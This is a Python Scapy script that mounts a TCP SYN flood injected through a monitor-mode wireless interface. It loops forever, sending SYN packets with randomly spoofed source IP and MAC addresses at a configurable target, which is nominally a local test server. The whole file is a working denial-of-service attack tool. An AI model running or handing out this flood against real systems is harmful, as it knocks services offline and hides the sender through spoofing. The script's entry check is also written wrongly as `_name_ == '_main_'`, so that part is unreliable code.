from scapy.all import *
import random

# Target configuration
TARGET_IP = "127.0.0.1"  # Replace with your test server's IP
TARGET_PORT = 9090       # Replace with your test server's port
IFACE = "wlp0s20f3mon"   # Replace with your wireless interface in monitor mode

def generate_syn_flood():
    print(f"Starting SYN Flood attack on {TARGET_IP}:{TARGET_PORT}")
    while True:
        try:
            # Random MAC addresses and IPs
            src_mac = ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))
            dst_mac = "ff:ff:ff:ff:ff:ff"  # Broadcast MAC
            src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
            src_port = random.randint(1024, 65535)

            # Radiotap and Dot11 layers
            radiotap_layer = RadioTap(
                present="Flags+Rate+Channel",
                Flags=0x10,  # Set flags (e.g., short preamble)
                Rate=2,      # 1 Mbps
                ChannelFrequency=2412,  # 2.4 GHz, channel 1
                ChannelFlags="2GHz+CCK",
                dBm_AntSignal=-50  # Example signal strength
            )

            dot11_layer = Dot11(
                addr1=dst_mac,  # Receiver MAC
                addr2=src_mac,  # Transmitter MAC
                addr3=dst_mac,  # BSSID
                FCfield="to-DS"  # Frame control field
            )

            llc_layer = LLC()
            snap_layer = SNAP()

            # IP and TCP layers for SYN flood
            ip_layer = IP(src=src_ip, dst=TARGET_IP)
            tcp_layer = TCP(sport=src_port, dport=TARGET_PORT, flags="S")

            # Combine all layers
            packet = radiotap_layer / dot11_layer / llc_layer / snap_layer / ip_layer / tcp_layer

            # Send the crafted packet
            sendp(packet, iface=IFACE, verbose=False)
        except KeyboardInterrupt:
            print("Stopping attack.")
            break
        except Exception as e:
            print(f"Error: {e}")
            break

if _name_ == "_main_":
    try:
        generate_syn_flood()
    except PermissionError:
        print("Run this script with administrator/root privileges.")